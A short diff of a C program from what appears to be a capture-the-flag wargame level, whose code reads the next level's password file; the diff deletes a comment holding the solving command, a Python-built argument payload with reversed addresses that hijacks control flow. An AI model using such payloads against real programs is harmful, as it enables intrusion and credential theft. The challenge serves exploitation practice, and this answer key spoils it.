@@ -29,7 +29,3 @@ int main(int argc, char **argv)
 	fgets(c, 68, fopen( "/home/user/level8/.pass", "r"));
 	puts("~~");
 }
-
-/*
-./level7 `python -c "print 'a' * 20 + '\x08\x04\x99\x28'[::-1]"` `python -c "print '\x08\x04\x84\xf4'[::-1]"`
-*/
